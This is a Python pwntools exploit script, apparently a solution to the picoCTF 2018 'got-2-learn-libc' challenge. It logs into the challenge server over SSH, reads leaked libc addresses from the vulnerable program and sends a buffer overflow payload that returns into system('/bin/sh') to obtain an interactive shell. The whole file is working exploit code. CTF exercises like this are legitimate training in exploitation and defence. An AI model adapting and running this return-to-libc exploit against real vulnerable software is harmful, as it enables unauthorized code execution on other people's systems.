from pwn import *

puts_libc = 0x0005f140
system = 0x0003a940

s = ssh(host = '2018shell3.picoCTF.com', user = 'kruzXavier')
s.set_working_directory('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee')

r = s.process('./vuln')


info = r.recvuntil('string:\n').split('\n')
puts_addr = int(info[2].split(' ')[1], 16)
bin_sh = int(info[6].split(' ')[1], 16)


base = puts_addr - puts_libc
system = base + system


payload = 'a'*0x9c + 'a'*0x4 + p32(system) + p32(0) + p32(bin_sh)
r.sendline(payload)

r.interactive()
